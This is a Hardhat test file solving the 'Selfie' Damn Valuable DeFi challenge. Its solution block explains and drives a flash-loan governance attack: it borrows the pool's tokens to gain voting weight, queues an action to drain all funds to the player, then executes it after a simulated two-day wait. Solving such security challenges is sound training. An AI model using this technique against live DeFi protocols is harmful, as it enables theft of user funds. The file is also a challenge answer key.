const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Selfie', function () {
    let deployer, player;
    let token, governance, pool;

    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token Snapshot
        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
        expect(await governance.getActionCounter()).to.eq(1);

        // Deploy the pool
        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
            token.address,
            governance.address    
        );
        expect(await pool.token()).to.eq(token.address);
        expect(await pool.governance()).to.eq(governance.address);
        
        // Fund the pool
        await token.transfer(pool.address, TOKENS_IN_POOL);
        await token.snapshot();
        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
        expect(await pool.flashFee(token.address, 0)).to.eq(0);

    });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    /**
     * It's really silly to apply governance on a contract that uses the same
     * asset to give flashloans. You can ask for a flashLoan at max. cap., and
     * then queue an action that all funds must be drained to the player address.
     * Wait for 2 days and that would be it.
     *
     * 1. Create a contract receiver.
     * 2. Ask for a flashloan.
     * 3. ReceiveTokens and take a snapshot, since it's a public function.
     * 4. queue an action to drainAllFunds to player.address.
     * 5. Return tokens.
     * 6. Wait 2 days.
     * 7. Profit
     */

    const ExploitSelfieFactory = await ethers.getContractFactory(
      "ExploitSelfie",
      player
    );
    const exploitSelfie = await ExploitSelfieFactory.deploy(
      pool.address,
      governance.address,
      token.address
    );
    
    await exploitSelfie.flashLoan();
    // 2 days
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);

    let actionExploitId = await exploitSelfie.getExploitActionId();
    governance = governance.connect(player);
    governance.executeAction(actionExploitId);
  });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(0);
    });
});
